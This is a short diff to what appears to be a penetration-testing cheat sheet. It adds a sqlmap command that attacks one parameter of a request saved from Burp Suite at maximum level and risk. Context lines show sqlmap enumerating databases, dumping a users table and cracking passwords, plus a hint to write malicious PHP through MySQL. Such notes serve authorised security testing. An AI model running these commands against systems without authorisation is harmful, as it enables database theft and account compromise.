@@ -164,6 +164,8 @@ sqlmap -o -u <url of page> --forms --dbs
 sqlmap -o -u <url of page> --forms -D <database_name> --tables
 # Dump info from users table and try to crack password
 sqlmap -o -u <url of page> --forms -D <database_name> -T <table_name> --dump
+# Get the GET or POST request from repeater in burpsuite
+sqlmap -r <request_file> -p <param to attack> --level=5 --risk=3
 ```
 * MySQL
   * If there's a php CLI server running or even if not, you can try to write malicious php code to certain files
